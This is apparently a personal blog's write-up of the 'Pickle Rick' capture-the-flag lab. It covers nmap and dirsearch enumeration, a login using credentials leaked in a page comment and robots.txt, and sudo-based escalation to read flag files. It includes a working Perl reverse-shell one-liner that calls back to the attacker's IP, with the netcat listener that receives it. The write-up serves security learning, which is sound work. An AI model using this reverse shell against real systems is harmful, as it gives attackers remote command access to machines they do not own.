# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# Pickle Rick | Writeup

An extra-fun web server exploitation room

Released: 2024-03-10

## 📡 NMAP Scan

```bash
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.108.226
[sudo] password for vipin: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 21:47 EST
Nmap scan report for 10.10.108.226
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

- Port 22 & 80 are open.

## 🌐 Accessing the website

- Port 80 is open according to the NMAP scan, this means a webpage should be on the server.

![Image showing the website](blog/picklerick/website.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- Judging by the blatent hint "**BURRRRP**", we need to use Burpsuite.

## 🟧🔎 Burpsuite & Dirsearch

![Image showing a comment](blog/picklerick/secretcomment.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2</small>
</div>

- The page source has a comment with a username, let's keep this for future reference.

- Since we have no leads to follow, let's run Dirsearch!

```bash
┌──(vipin㉿vipin)-[~]
└─$ dirsearch -u http://10.10.108.226 --exclude-status 403,404
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                      
 (_||| _) (/_(_|| (_| )                                                                               
                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/vipin/reports/http_10.10.108.226/_24-03-09_23-40-12.txt

Target: http://10.10.108.226/

[23:40:12] Starting:                                                                                  
[23:40:36] 200 -  588B  - /assets/                                          
[23:40:36] 301 -  315B  - /assets  ->  http://10.10.108.226/assets/
[23:40:53] 200 -  455B  - /login.php                                        
[23:41:03] 200 -   17B  - /robots.txt                                       
                                                                             
Task Completed
```

## Aquiring the Ingredients

- I will look at */robots.txt* as typically challenge creators place a lot of information here...

![Image showing robots.txt](blog/picklerick/robotstxt.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2 */robots.txt*</small>
</div>

- Odd... I will also keep this for future reference.

- */login.php* seems to be the only page of use.

![Image showing login page](blog/picklerick/login.png 'Fig.4')
<div style={{ textAlign: 'center' }}>
  <small>Fig.4</small>
</div>

- We know the username is *R1ckRul3s*... But what if we try that string of text we found in */robots.txt*?

![Image showing us logged in](blog/picklerick/loggedin.png 'Fig.5')
<div style={{ textAlign: 'center' }}>
  <small>Fig.5</small>
</div>

- IT WORKED!!!! It seems like we get a Command Panel to the server.

- Running ```ls``` in the Command Panel outputs this... (see Fig.6)

![Image showing me running ls](blog/picklerick/ls.png 'Fig.6')
<div style={{ textAlign: 'center' }}>
  <small>Fig.6</small>
</div>

- Let's try to view the first ingredient...

![Image showing it not letting me](blog/picklerick/commandissue.png 'Fig.7')

- I think we have to spawn a Reverse Shell (I will be using [revshells.com](https://www.revshells.com/))

```bash
# This is what I entered in the Command Panel to gain a reverse shell.

perl -e 'use Socket;$i="10.6.22.229";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

- On my own terminal...

```bash
──(vipin㉿vipin)-[~]
└─$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.6.22.229] from (UNKNOWN) [10.10.108.226] 35408
sh: 0: can't access tty; job control turned off
$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

- We got the first ingredient so let's try to get the second ingredient too!

```bash
$ pwd
/home/rick
$ cat second\ ingredients
1 jerry tear
$ 
```

- To get the final ingredient, we need to privilege escalate. Running ```sudo -l``` informs me I have full `sudo` permissions. Let's aquire the final ingredient...

```bash
$ sudo ls root
3rd.txt
snap
$ sudo cat /root/3rd.txt
3rd ingredients: fleeb juice
$ 
```

### MACHINE PWN'ED 😎

